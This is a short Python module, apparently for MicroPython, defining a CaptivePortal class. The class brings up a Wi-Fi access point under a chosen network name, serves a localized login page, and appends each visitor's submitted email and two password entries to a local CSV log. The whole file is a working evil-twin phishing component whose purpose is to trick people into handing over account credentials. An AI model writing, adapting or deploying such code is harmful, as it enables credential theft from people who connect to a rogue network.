# -*- coding: utf-8 -*-

import ujson as json


class CaptivePortal:

  def __init__(self, tools, config):
    self.tools = tools
    self.lang = config['lang']
    self.essid = config['essid']

  def get_page(self):
    page = open('data/captive_portal/page.html').read()
    lang_file = open('data/captive_portal/lang.json')
    lang = json.load(lang_file)[self.lang]
    page = page.replace('{lang}', self.lang)
    page = page.replace('{essid}', self.essid)
    for key in lang:
      page = page.replace('{%s}' % key, lang[key])
    return page

  def log_credentials(self, request):
    email = request['email'].replace('%40', '@')
    pass1 = request['pass1']
    pass2 = request['pass2']
    entry = '%s,%s,%s\n' % (email, pass1, pass2)
    with open('data/captive_portal/log.csv', 'a') as f:
      f.write(entry)

  def start(self):
    self.tools.start_ap(self.essid)
    self.tools.start_server(
      'PORTAL',
      self.get_page,
      self.log_credentials
    )
